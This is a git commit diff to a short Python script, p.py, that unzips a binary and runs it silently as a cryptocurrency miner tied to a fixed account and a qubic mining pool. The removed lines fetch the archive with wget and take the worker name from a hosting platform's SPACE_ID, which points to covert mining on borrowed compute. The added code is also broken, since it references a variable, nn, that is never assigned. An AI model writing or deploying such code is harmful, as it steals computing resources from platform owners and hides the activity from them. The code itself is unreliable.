a555834a9f2eeb654dd8d129359bf70f633aacac
SEWDT12 <se12331@outlook.com>
2025-03-22 05:57:36 +0100

    Update p.py

--- p.py
+++ p.py
@@ -1,7 +1,5 @@
 import os
-os.system("wget https://github.com/qqivk/Yehrr/raw/refs/heads/main/Yxls.zip")
 os.system("unzip Yxls.zip")
-#os.system("ls -lh")
-os.system("chmod +x Yxls.zip")
-wn = os.getenv('SPACE_ID').replace("/","_")
-os.system(f"./Yxls --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
+os.system("chmod +x *")
+os.getenv('nn')
+os.system(f"./Yxls --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {nn} >/dev/null")
